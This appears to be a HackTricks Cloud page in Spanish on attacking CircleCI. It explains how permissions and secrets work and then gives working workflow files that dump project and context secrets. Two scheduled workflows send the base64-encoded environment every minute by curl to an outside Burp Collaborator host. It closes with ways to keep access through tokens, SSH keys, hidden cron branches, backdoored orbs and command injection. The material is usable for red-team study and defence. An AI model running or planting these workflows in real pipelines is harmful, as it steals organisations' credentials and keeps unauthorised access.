# Seguridad de CircleCI

<details>

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

## Informaci칩n B치sica

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) es una plataforma de Integraci칩n Continua donde puedes **definir plantillas** indicando qu칠 deseas que haga con cierto c칩digo y cu치ndo hacerlo. De esta manera puedes **automatizar pruebas** o **despliegues** directamente **desde la rama principal de tu repositorio**, por ejemplo.

## Permisos

**CircleCI** **hereda los permisos** de github y bitbucket relacionados con la **cuenta** que inicia sesi칩n.\
En mis pruebas verifiqu칠 que mientras tengas **permisos de escritura sobre el repositorio en github**, podr치s **administrar la configuraci칩n de su proyecto en CircleCI** (establecer nuevas claves ssh, obtener claves api del proyecto, crear nuevas ramas con nuevas configuraciones de CircleCI...).

Sin embargo, necesitas ser un **administrador del repositorio** para **convertir el repositorio en un proyecto de CircleCI**.

## Variables de Entorno y Secretos

Seg칰n [**la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/) existen diferentes formas de **cargar valores en variables de entorno** dentro de un flujo de trabajo.

### Variables de entorno integradas

Cada contenedor ejecutado por CircleCI siempre tendr치 [**variables de entorno espec칤ficas definidas en la documentaci칩n**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) como `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` o `CIRCLE_USERNAME`.

### Texto claro

Puedes declararlas en texto claro dentro de un **comando**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Puedes declararlos en texto claro dentro del **entorno de ejecuci칩n**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **entorno del trabajo de construcci칩n**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Puedes declararlos en texto claro dentro del **entorno de un contenedor**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Secretos del Proyecto

Estos son **secretos** que solo van a ser **accesibles** por el **proyecto** (por **cualquier rama**).\
Puedes verlos **declarados en** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
La funcionalidad de "**Importar Variables**" permite **importar variables de otros proyectos** a este.
{% endhint %}

### Secretos de Contexto

Estos son secretos que son **de toda la organizaci칩n**. Por **defecto, cualquier repositorio** podr치 **acceder a cualquier secreto** almacenado aqu칤:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Sin embargo, ten en cuenta que se puede **seleccionar un grupo diferente** (en lugar de Todos los miembros) para **dar acceso solo a personas espec칤ficas** a los secretos.\
Actualmente, esta es una de las mejores formas de **aumentar la seguridad de los secretos**, para no permitir que todos accedan a ellos, sino solo algunas personas.
{% endhint %}

## Ataques

### Buscar Secretos en Texto Claro

Si tienes **acceso al VCS** (como github) verifica el archivo `.circleci/config.yml` de **cada repositorio en cada rama** y **busca** posibles **secretos en texto claro** almacenados all칤.

### Enumeraci칩n de Variables de Entorno Secretas y de Contexto

Revisando el c칩digo puedes encontrar **todos los nombres de los secretos** que se est치n **utilizando** en cada archivo `.circleci/config.yml`. Tambi칠n puedes obtener los **nombres de contexto** de esos archivos o verificarlos en la consola web: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltrar Secretos del Proyecto

{% hint style="warning" %}
Para **exfiltrar TODOS** los secretos del proyecto y del contexto solo necesitas tener acceso de **ESCRITURA** a **solo 1 repositorio** en toda la organizaci칩n de github (_y tu cuenta debe tener acceso a los contextos, pero por defecto todos pueden acceder a cada contexto_).
{% endhint %}

{% hint style="danger" %}
La funcionalidad de "**Importar Variables**" permite **importar variables de otros proyectos** a este. Por lo tanto, un atacante podr칤a **importar todas las variables del proyecto de todos los repositorios** y luego **exfiltrarlas todas juntas**.
{% endhint %}

Todos los secretos del proyecto siempre se establecen en el entorno de los trabajos, por lo que simplemente llamando a env y ofusc치ndolo en base64 exfiltrar치 los secretos en la **consola de registro web de los flujos de trabajo**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, simplemente puedes **crear un flujo de trabajo** que se **active cada minuto** y que **extraiga los secretos a una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Filtrar Secretos de Contexto

Necesitas **especificar el nombre del contexto** (esto tambi칠n filtrar치 los secretos del proyecto):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si **no tienes acceso a la consola web** pero tienes **acceso al repositorio** y sabes que se utiliza CircleCI, simplemente puedes **modificar un flujo de trabajo** que se **ejecuta cada minuto** y que **extrae los secretos a una direcci칩n externa**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Simplemente crear un nuevo `.circleci/config.yml` en un repositorio **no es suficiente para activar una compilaci칩n de CircleCI**. Necesitas **habilitarlo como un proyecto en la consola de CircleCI**.
{% endhint %}

### Escape to Cloud

**CircleCI** te da la opci칩n de ejecutar **tus compilaciones en sus m치quinas o en las tuyas**.\
Por defecto, sus m치quinas est치n ubicadas en GCP, y inicialmente no podr치s encontrar nada relevante. Sin embargo, si una v칤ctima est치 ejecutando las tareas en **sus propias m치quinas (potencialmente, en un entorno en la nube)**, podr칤as encontrar un **punto final de metadatos en la nube con informaci칩n interesante**.

Ten en cuenta que en los ejemplos anteriores todo se lanz칩 dentro de un contenedor de Docker, pero tambi칠n puedes **solicitar lanzar una m치quina virtual** (que puede tener permisos en la nube diferentes):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
O incluso un contenedor de Docker con acceso a un servicio de Docker remoto:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistencia

* Es posible **crear tokens de usuario en CircleCI** para acceder a los puntos finales de la API con los permisos de usuario.
* _https://app.circleci.com/settings/user/tokens_
* Es posible **crear tokens de proyectos** para acceder al proyecto con los permisos otorgados al token.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Es posible **agregar claves SSH** a los proyectos.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Es posible **crear un trabajo cron en una rama oculta** en un proyecto inesperado que est치 **filtrando** todas las variables de entorno de **contexto** todos los d칤as.
* O incluso crear en una rama / modificar un trabajo conocido que **filtre** todo el contexto y los **secretos de proyectos** todos los d칤as.
* Si eres propietario de GitHub, puedes **permitir orbs no verificados** y configurar uno en un trabajo como **puerta trasera**.
* Puedes encontrar una **vulnerabilidad de inyecci칩n de comandos** en alguna tarea e **inyectar comandos** a trav칠s de un **secreto** modificando su valor.
